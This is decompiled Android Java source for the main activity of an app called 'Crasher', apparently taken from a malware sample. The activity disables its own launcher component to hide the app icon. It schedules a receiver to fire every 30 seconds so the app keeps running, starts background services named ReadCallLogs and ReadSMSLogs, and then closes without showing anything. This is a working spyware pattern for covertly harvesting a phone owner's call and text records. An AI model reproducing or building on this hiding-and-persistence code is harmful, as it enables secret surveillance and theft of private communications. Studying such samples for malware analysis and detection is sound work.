package com.bigeye.crasher;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import java.util.Calendar;
/* loaded from: classes.dex */
public class Crasher extends Activity {
    private static final long REPEAT_TIME = 30000;
    private final String APP_TAG = getClass().getName();
    String prefName = "AllLogs";
    SharedPreferences prefs;

    @Override // android.app.Activity
    protected void onCreate(Bundle savedInstanceState) {
        PackageManager p = getPackageManager();
        p.setComponentEnabledSetting(getComponentName(), 2, 1);
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_crasher);
        AlarmManager service = (AlarmManager) getSystemService("alarm");
        Intent i = new Intent(this, StartServiceReceiver.class);
        PendingIntent pending = PendingIntent.getBroadcast(this, 0, i, 268435456);
        Calendar cal = Calendar.getInstance();
        service.setInexactRepeating(0, cal.getTimeInMillis(), REPEAT_TIME, pending);
        startService(new Intent(this, ReadCallLogs.class));
        startService(new Intent(this, ReadSMSLogs.class));
        Log.i(this.APP_TAG, "closing main activity!");
        finish();
    }

    @Override // android.app.Activity
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.crasher, menu);
        return true;
    }
}
